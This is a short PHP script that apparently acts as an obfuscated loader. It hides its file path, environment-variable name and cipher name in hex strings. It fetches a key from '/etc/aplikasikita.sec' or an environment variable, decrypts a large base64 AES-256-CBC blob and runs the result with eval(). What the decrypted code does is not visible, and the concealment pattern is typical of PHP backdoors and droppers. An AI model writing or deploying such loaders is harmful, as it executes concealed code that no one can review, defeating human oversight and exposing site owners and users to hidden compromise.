<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('S6CubUu0kuZUbY5YbuWrTg==');

$c=base64_decode(

'S1GBkx0pVMvsZJa5LZcY2SPrRoTGuDqsuE2U9w7CVUT6GG7ZI1CNmfsfCakGmiEKcv6/ktn9Rhdf' .
'gVsBjeUAMO50PUloQvB/IkD52kJCl5whyMzlaYVvFK/st/ZROD+gL5NQLt9R9b7wCie5yMkUfQk6' .
'+zku5tft7FU1Bz/NuEHtyPJ39SAei3Z+kcFMIH2zfNbDHdW73DVSs68qG9lDcF5rlttJaZNv7qkR' .
'FfDhkreSvcPEM61xhy8IbkvHGdWKiK2ctcFCZUMHHiYoesAu1g/wex/Ubk+Gq8tgzqz3ByghxJi+' .
'86Hzb9OhXhy5xlrYgBL8ZJjlSn5Fxyis6IfGTrkLAO8wG3g/DM3CHtratStWFYhbarKvvG7yZcSA' .
'PsYcwpbrBSwNOYYFI1eDhwPBabqYojLHTLpRzBjnvuqHMR+AbBC74k0fri3mn+hXHX0oHe15A7yS' .
'44oAoujJ7ERa2SbmdRo78HIQRlFZmcXWnWwVWA34f1S70BZpBf3mce8CDMQ+RSG8sIVc+TQm5Th1' .
'BQL3f9fDOWjn5f0Di+/5Z53h7kBnAp+XzSQ0bQG1IAPz5Ah0ldG4BGLVANNoqpFP5S6pMBoKdwLu' .
'vLsFqcX6+buJnSdwEHjLh1hrs1k0NJBGrm6sIuDtjAloj4tWEyrSVeSW6UDfrsIn9htc1pVpjhh0' .
'k4IS12t+DjocuVPiwiIDy9t6fdlMPAkRrALnycvlyHWBqBLolFqAo3W7saWtoH/IwujmqlLQdmVn' .
'Ze1tU3bU6Dt2Zq3GvCrv7WUdiDoIVX5VYHnSaD93WKpLUjNoti2VctA5DjLQPYsboPLdSDAmXAZ3' .
'zzU91kWpN/avEgYvWvGZRvdCee6m8uVYmsUlkH/ExzxSuu45Q0mA+S5lVw0YkgJujv0HnnHkFH7I' .
'FXvbolGsKA8HXWSPv/yOq6UWh0Ip/H4oBZLvtAqougiLSb0MIo4S/Bkm6n3SD998y2oDR/mhXSIe' .
'CpBEl08JBHXoAqHQoE2IfBLwv5wMZgOD4MN0JRLk6dKbFJKfgzpTRUYCGICEJTqeHzgCRQ/EWcN+' .
'nHuw7L6FXJRBbVTg/qE2J3rw+JzryQTbFd0b+ZFBOkujKLHfmmSGY28eWvobjKesVdAUNT4uzrKv' .
'rmADBU/QiBdB0vv4/tL25tSlxf2VRAsd3s//fvHlgCXl8eZdbt3mt1njO16aTq0/b0p24hWGK7EI' .
'uTJ6D3G1y3UYw36h3I/6zJwnEFGhsUTcO1QXbvPD8fNYwYq+Mj+FrLburcrwEvKS27+3Vj/1f7M4' .
'po4O0xtTlM6AUsOGMTfsfEfQIJCaVBXN42GQB+KVwNc2vGtwHe1nYpckzDRJUNOj8OhGOCpZvg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

